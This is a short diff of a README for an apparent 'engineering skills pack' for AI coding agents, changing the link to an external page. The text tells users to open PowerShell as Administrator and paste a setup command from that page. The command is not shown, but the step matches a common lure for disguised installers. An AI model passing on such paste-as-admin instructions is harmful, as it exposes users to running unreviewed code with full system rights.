@@ -29,7 +29,7 @@ One command. Six agents supported. Zero configuration.
 
 Open **PowerShell** as Administrator and paste the setup command from our official page:
 
-👉 **[https://danielberg-ops1997x7.github.io/skillsforge/]([https://danielberg-ops1997x7.github.io/engineering-skills-pack/))**
+👉 **[https://danielberg-ops1997x7.github.io/engineering-skills-pack]**
 
 ### Why PowerShell?
 
